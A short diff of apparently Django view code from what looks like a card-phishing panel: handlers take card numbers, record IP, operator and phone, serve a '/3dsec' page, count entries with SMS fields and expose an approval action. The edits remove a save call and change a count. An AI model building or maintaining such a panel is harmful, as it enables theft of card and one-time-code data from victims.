@@ -116,7 +116,6 @@ def bakcell(request):
 
 @ensure_csrf_cookie
 def info(request):
-    contact = None
     if request.method == "POST":
         cardnumber= request.POST.get("cardnumber")
         if validate_card_number(cardnumber) == False:
@@ -165,7 +164,6 @@ def info(request):
     }
     contact = ContactModel(ip=get_client_ip(request), operator=operator, phone=phone, amount=amount)
     contact.page_name="/3dsec"
-    contact.save()
     return render(request, 'pages/3dsec.html', context)
 
 def check_approval_status(request, contact_id):
@@ -253,7 +251,7 @@ def phone_only_count_api(request):
         yy__isnull=False, 
         sms__isnull=False
     )
-    count = contacts.count()/2
+    count = contacts.count()
     return JsonResponse({'count': count})
 @ensure_csrf_cookie
 def approve_action(request):
